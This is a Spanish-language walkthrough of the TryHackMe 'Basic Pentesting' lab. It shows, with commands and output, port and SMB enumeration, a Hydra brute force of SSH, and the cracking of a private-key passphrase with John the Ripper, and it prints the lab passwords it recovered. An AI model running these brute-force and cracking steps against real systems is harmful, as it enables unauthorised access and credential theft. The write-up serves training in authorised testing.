---
tags:
  - eJPT
title: Machine Basic pentesting
Category: Try Hack Me
comments: "true"
image: /assets/img/machines/Basicpentesting/Basicpentestingbanner.jpeg
---

## Introducción
En esta máquina, realicé un proceso completo de pentesting que incluyó enumeración de puertos, análisis de servicios expuestos, enumeración web y fuerza bruta sobre el servicio SSH. Utilicé herramientas como Nmap, Gobuster y Enum4Linux para descubrir rutas ocultas y usuarios activos. Luego, con técnicas de fuerza bruta y explotación de credenciales, conseguí acceso a dos usuarios diferentes en el sistema. Finalmente, mediante la extracción y cracking de una clave privada SSH, logré escalar privilegios y acceder a información sensible, capturando la flag correspondiente.

## Skills
- Brute forcing
- Hash cracking

## Enumeración
Ejecutamos un escaneo de puertos específicos sobre los puertos 22, 80, 139 y 445. El objetivo era identificar servicios expuestos y obtener información relevante para continuar con la fase de enumeración, detectando servicios como SSH, HTTP y SMB:

```bash
❯ nmap -sCV -p 22,80,139,445 10.10.248.211
Nmap scan report for 10.10.248.211
Host is up (0.24s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87:6a:17:ed:4a:7b:81:74:ef:cd:ae:28:d4:b8:05:4d (RSA)
|   256 a5:81:26:1c:44:55:c6:c0:f4:9a:71:e9:24:21:e3:04 (ECDSA)
|_  256 ac:fd:32:0c:a3:db:9f:76:0b:33:a1:b4:21:ae:92:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
| 
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds
```
### Enumeración WEB
Accedemos a la interfaz web del servidor a través del puerto 80, en donde se muestra un mensaje simple indicando que el sitio está en mantenimiento:

![1](/assets/img/machines/Basic pentesting/1.jpeg)


```bash
❯ gobuster dir -u http://10.10.248.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.248.211
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.10.248.211/development/]
```

Realicé una enumeración de directorios con el fin de identificar rutas ocultas en la aplicación web. Como resultado, encontré el directorio /development, lo que podría indicar la presencia de archivos de prueba o entornos de desarrollo expuestos.

![2](/assets/img/machines/Basic pentesting/2.jpeg)

Dentro de la ruta /development se encontraron dos archivos: dev.txt y j.txt. Estos archivos contienen una conversación interna del equipo, donde se destaca especialmente el servicio SMB, lo que sugiere que podría ser un punto relevante para la siguiente fase de la enumeración.


Tras identificar la importancia del servicio SMB, se procedió a realizar una enumeración exhaustiva sobre este servicio utilizando la herramienta enum4linux para obtener información detallada de los recursos compartidos, usuarios y posibles vulnerabilidades.

```bash
enum4linux -a 10.10.248.211
```

Mediante la enumeración con enum4linux, se descubrió la existencia de dos usuarios en el sistema: kay y jan, lo que permitió enfocar los siguientes pasos en obtener credenciales o acceder a recursos asociados a estas cuentas.

![3](/assets/img/machines/Basic pentesting/3.jpeg)

## Brute Forcing
Posteriormente, realicé un ataque de fuerza bruta contra el servicio SSH utilizando la herramienta Hydra, enfocándome en el usuario jan y utilizando el popular diccionario rockyou.txt para intentar descubrir la contraseña.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.248.211 ssh
```

Gracias al ataque de fuerza bruta, logré obtener la contraseña armando para el usuario jan.

```plaintext
Password: armando
```

Con la contraseña obtenida, accedí al servicio SSH usando el usuario jan. Una vez dentro, confirmé los privilegios del usuario ejecutando el comando id, el cual mostró que jan tiene un UID y GID propios, perteneciendo al grupo principal de usuario.

```bash
ssh jan@10.10.248.211
jan@ip-10-10-248-211:~$ id
uid=1001(jan) gid=1001(jan) groups=1001(jan)
```

Para continuar con la enumeración local, transferí la herramienta linPEAS desde mi máquina local hacia el directorio /tmp del servidor objetivo utilizando SCP, con el fin de identificar posibles vectores de escalada de privilegios.

```bash
scp linpeas.sh jan@10.10.248.211:/tmp
```

Después de transferir linPEAS, le asigné permisos de ejecución y lo lancé para realizar un escaneo automático en busca de posibles vulnerabilidades y configuraciones erróneas que pudieran permitir la escalada de privilegios.

```bash
jan@ip-10-10-248-211:/tmp$ chmod +x linpeas.sh
jan@ip-10-10-248-211:/tmp$ ./linpeas.sh
```

## Hash Cracking
La ejecución de linPEAS reveló la presencia de una clave privada SSH (id_rsa) perteneciente al usuario kay, lo cual podría facilitar el acceso a dicha cuenta si la clave no estuviera protegida por contraseña.

![4](/assets/img/machines/Basic pentesting/4.jpeg)

Luego de obtener la clave privada id_rsa del usuario kay, procedí a convertirla a un formato compatible con John the Ripper usando la herramienta ssh2john para intentar crackear la contraseña de la clave.

```bash
ssh2john kay_id_rsa > key.txt  
```

Seguidamente, utilicé John con el diccionario rockyou.txt para intentar descifrar la contraseña de la clave privada obtenida.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
```

Con esta técnica logré obtener la contraseña beeswax para la clave privada del usuario kay.

```bash
Password: beeswax
```

Con la contraseña recuperada, accedí por SSH como el usuario kay. Dentro de su directorio encontré un archivo llamado pass.bak, que contenía una contraseña aparentemente robusta y conforme a políticas de seguridad establecidas.

```bash
ssh -i kay_id_rsa kay@10.10.248.211
kay@ip-10-10-248-211:~$ ls
pass.bak
kay@ip-10-10-248-211:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

